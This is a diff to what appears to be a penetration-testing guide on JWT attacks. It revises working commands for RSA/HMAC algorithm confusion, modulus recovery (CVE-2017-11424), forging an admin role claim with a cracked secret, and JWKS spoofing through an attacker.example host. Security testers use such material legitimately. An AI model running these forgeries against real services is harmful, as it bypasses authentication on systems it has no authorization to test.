@@ -105,8 +105,8 @@ openssl s_client -connect target:443 </dev/null 2>/dev/null \
   | openssl x509 -pubkey -noout > public.pem
 
 # 3. Recover it from two tokens by RSA math when no key is published
-#    (jwt_tool and the 'rsa_sign2n' tool derive n from two signatures)
-python3 jwt_tool.py <token1> <token2> -X k   # or use rsa_sign2n/CVE-2017-11424
+#    (rsa_sign2n derives n from two signatures and emits candidate PEMs)
+python3 jwt_forgery.py <token1> <token2>     # CVE-2017-11424; feed a candidate PEM into -X k above
 ```
 
 The PEM must match byte-for-byte, including the trailing newline — a mismatch
@@ -132,7 +132,7 @@ Try common and framework-default secrets first: `secret`, `secretkey`,
 `jwt.io` demo secret. Once cracked, forge with the recovered key:
 
 ```bash
-python3 jwt_tool.py <token> -S hs256 -p '<secret>' -pc role -pv admin
+python3 jwt_tool.py <token> -I -pc role -pv admin -S hs256 -p '<secret>'
 ```
 
 A recovered signing secret is a full authentication bypass — report it as
@@ -147,7 +147,7 @@ key.
 
 ```bash
 # Generate a key pair and a JWKS to serve
-jwx jwk generate --type RSA --curve --output-format json > priv.json
+jwx jwk generate --type RSA --keysize 2048 --output-format json > priv.json
 # Publish the public half as /jwks.json on a host you control, then:
 python3 jwt_tool.py <token> -X s -ju https://attacker.example/jwks.json
 ```
